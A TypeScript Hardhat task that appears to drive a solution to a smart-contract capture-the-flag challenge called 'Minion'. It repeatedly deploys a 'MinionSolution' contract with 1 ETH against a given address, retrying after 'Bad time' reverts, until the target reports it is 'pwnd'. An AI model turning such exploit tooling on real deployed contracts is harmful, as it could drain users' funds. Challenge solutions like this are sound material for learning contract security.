import { MinionSolution } from "../typechain";
import { task, types } from "hardhat/config";
import { HardhatRuntimeEnvironment, TaskArguments } from "hardhat/types";

async function sleep(ms: number) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

task("solveMinion", "Solves the Minion challenge")
    .addParam("minionAddress", "Address of the exploitable contract", undefined, types.string, false)
    .setAction(async (args: TaskArguments, hre: HardhatRuntimeEnvironment) => {
        if (!hre.ethers.utils.isAddress(args.minionAddress)) {
            throw new Error(`Invalid contract address format: ${args.minionAddress}`);
        }

        const minionSolutionFactory = await hre.ethers.getContractFactory("MinionSolution");
        let minionSolution: MinionSolution | undefined;

        let isPwnd = false;

        while (!isPwnd) {
            try {
                minionSolution = await minionSolutionFactory.deploy(args.minionAddress, {
                    value: hre.ethers.utils.parseEther("1.0"),
                });
            } catch (error: any) {
                const reason = error.message.match(/([^']+)'([^']+)'/);
                if (reason[2] !== "Bad time") {
                    throw error;
                }

                console.log("Bad time. Sleeping for 20 seconds...");
                await sleep(20000);
            }

            if (minionSolution !== undefined) {
                console.log("Deployed MinionSolution at address:", minionSolution.address);
                isPwnd = await minionSolution.isPwnd();
            }
        }

        if (isPwnd) {
            console.log("Minion is pwnd!");
        } else {
            console.log("Minion is not pwnd!");
        }
    });
